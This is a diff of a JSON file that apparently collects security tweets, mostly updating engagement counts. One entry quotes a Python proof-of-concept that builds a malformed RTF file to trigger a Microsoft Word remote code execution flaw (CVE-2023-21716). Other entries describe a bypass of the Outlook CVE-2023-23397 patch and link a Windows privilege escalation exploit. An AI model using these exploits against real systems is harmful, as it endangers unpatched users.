@@ -125,6 +125,16 @@
     "username": "cyber_advising"
 }
 {
+    "tweetfavorites": 304,
+    "tweetquotes": 6,
+    "tweetreplies": 14,
+    "tweetretweets": 121,
+    "tweettext": "Thanks to @domchell, I've confirmed that Microsoft only fixed CVE-2023-23397 for remote sound URIs where the host has a '.' in them.\nA SMB host accessible by hostname only can still be used to trigger this bug.\nAttackers on your LAN can still use CVE-2023-23397\nTHIS_IS_FINE.PNG https://t.co/ARpRcS9vzK",
+    "tweettime": "2023-03-17, 14:50:48",
+    "tweeturl": "https://twitter.com/wdormann/status/1636741880674222081",
+    "username": "wdormann"
+}
+{
     "expanded_url": [
         "https://github.com/vu-ls/Crassus"
     ],
@@ -334,10 +344,10 @@
     "expanded_url": [
         "https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768"
     ],
-    "tweetfavorites": 2001,
+    "tweetfavorites": 1973,
     "tweetquotes": 18,
-    "tweetreplies": 34,
-    "tweetretweets": 599,
+    "tweetreplies": 32,
+    "tweetretweets": 589,
     "tweettext": "Releasing a Windows 11 LPE exploit by @FuzzySec and I. Exploits CVE-2023-21768, a vuln in afd.sys. Blog post soon!\nhttps://t.co/iqQYsw5TmP https://t.co/8ypb4mZGtN",
     "tweettime": "2023-03-08, 16:02:20",
     "tweeturl": "https://twitter.com/chompie1337/status/1633498392125997056",
@@ -455,10 +465,10 @@
     "username": "strinsert1Na"
 }
 {
-    "tweetfavorites": 357,
+    "tweetfavorites": 355,
     "tweetquotes": 3,
     "tweetreplies": 8,
-    "tweetretweets": 93,
+    "tweetretweets": 91,
     "tweettext": "CVE-2023-21716(Microsoft Word RCE vuln) Python PoC @momika233 \n\nopen(\"t3zt.rtf\",\"wb\").write((\"{\\\\rtf1{\\n{\\\\fonttbl\" + \"\".join([ (\"{\\\\f%dA;}\\n\" % i) for i in range(0,32761) ]) + \"}\\n{\\\\rtlch no crash??}\\n}}\\n\").encode('utf-8'))",
     "tweettime": "2023-03-06, 11:53:48",
     "tweeturl": "https://twitter.com/momika233/status/1632711072095387648",
